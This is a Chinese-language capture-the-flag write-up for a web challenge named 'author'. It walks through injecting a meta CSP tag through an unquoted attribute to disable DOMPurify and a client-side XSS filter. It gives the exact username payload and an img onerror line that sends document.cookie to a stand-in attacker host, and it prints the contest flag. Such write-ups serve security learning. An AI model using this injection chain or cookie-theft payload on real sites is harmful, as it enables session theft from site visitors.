# author

## 题目简述

题目是一套带管理员审核 Bot 的博客。Bot 登录后携带 `flag` cookie，访问选手提交的文章并点击审核、拒绝按钮。文章内容由 `/api/articles/{id}` 返回，再由 `article.js` 写入 `innerHTML`；在此之前页面会加载 DOMPurify 和 `xss-shield.js`，后者 Hook DOM 操作并对内容重复净化。漏洞位于作者 meta 标签：用户名虽然经过 PHP 7.4 的 `htmlspecialchars()`，却被放进未加引号的属性值中。

## 解题过程

### 还原渲染链

关键模板与客户端逻辑分别是：

```php
<?php $pageAuthor = htmlspecialchars($article['username']); ?>
<meta name="author" content=<?php echo $pageAuthor; ?>>
```

```javascript
const response = await fetch(`/api/articles/${articleId}`);
const article = (await response.json()).data;
document.getElementById('article-content').innerHTML = article.content;
```

`content=` 没有引号，所以用户名中的空格可以结束原属性并注入 `http-equiv`。环境使用 PHP 7.4，`htmlspecialchars()` 的默认模式会转义双引号而不转义单引号，可以用单引号包住 CSP 内容。

### 用 CSP 禁用防护脚本

不能粗暴禁用所有脚本，因为仍需保留 `article.js` 来取回并渲染恶意文章。注册时将用户名设置为：

```text
'script-src-elem http://blog-app/assets/js/article.js ' http-equiv=content-security-policy
```

最终生成的标签近似为：

```html
<meta name="author"
      content='script-src-elem http://blog-app/assets/js/article.js '
      http-equiv=content-security-policy>
```

该 CSP 只允许题目自己的 `article.js` 作为外部脚本加载，因此 `purify.min.js` 和 `xss-shield.js` 被浏览器拦截；页面没有另外设置 `script-src-attr`，文章中的内联事件仍可执行。

### 触发 Bot

用上述账号发布文章，正文放置最小外带 payload：

```html
<img src=x onerror="fetch('https://attacker.example/?c='+encodeURIComponent(document.cookie))">
```

将文章 ID 提交给审核服务。Bot 携带 flag cookie 访问文章，`article.js` 把内容写入 DOM，图片加载失败后触发 `onerror`，回传 cookie。比赛环境的验证值为 `RCTF{h0w_d1d_u_byp455_th3_w4f_4nd_x55}`。

## 方法总结

- 核心技巧：未加引号的 meta 属性注入，再借 CSP 精确阻断客户端 XSS 防护脚本。
- 识别信号：用户字段进入未引用的 HTML 属性；安全逻辑由可被 CSP 控制的前端脚本实现；业务脚本仍会把原始内容写入 `innerHTML`。
- 复用要点：构造 CSP 时不能只考虑“阻止什么”，还要保留完成利用链所需的加载路径；同时确认目标 PHP 版本下实体编码的默认行为。
